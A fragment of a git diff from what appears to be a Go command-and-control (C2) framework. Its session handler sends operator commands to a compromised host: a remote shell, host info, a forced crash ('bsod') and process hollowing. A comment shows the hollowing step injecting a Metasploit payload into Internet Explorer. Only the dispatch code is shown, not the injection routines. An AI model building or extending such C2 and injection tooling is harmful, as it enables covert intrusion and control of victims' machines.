@@ -165,9 +165,9 @@ func openSession(id int, sl *SessionList) {
 			//filePathTarget = "\"" + filePathTarget + "\"" //Not the sexiest fix but will do for now
 			fmt.Println(filePathLocal)
 			fmt.Println(filePathTarget)
-			hollow2(&current.Conn, filePathLocal, filePathTarget) //hollow /home/hummus/Git/Dev/Go/Demolitron_C2/Bushido/msf.bin "C:\\Program Files\\Internet Explorer\\iexplore.exe"
+			hollow(&current.Conn, filePathLocal, filePathTarget) //hollow /home/hummus/Git/Dev/Go/Demolitron_C2/Bushido/msf.bin "C:\\Program Files\\Internet Explorer\\iexplore.exe"
 		}
-		switch command { //All of the func below will be found under bushido.go
+		switch command { //All of the functions called below will be found under bushido.go
 		case "shell":
 			shell(&current.Conn)
 		case "hostinfo":
@@ -198,13 +198,8 @@ func openSession(id int, sl *SessionList) {
 			pwd(&current.Conn)
 		case "hollow":
 			fmt.Println("Usage: hollow <pathToExeLocal> <\"path2ExeRemote\">")
+			fmt.Println("Windows paths should have double  as such: \"C:\\Progarm Files\\Internet Explorer\\iexplore.exe\"")
 		default:
-		case "hollow4":
-			hollow4(&current.Conn)
-			fmt.Println("\nUsage: shell, hostinfo, load, bsod, cd, ls, pwd, bg\n")
-		case "check":
-			check(&current.Conn)
 		}
-
 	}
 }
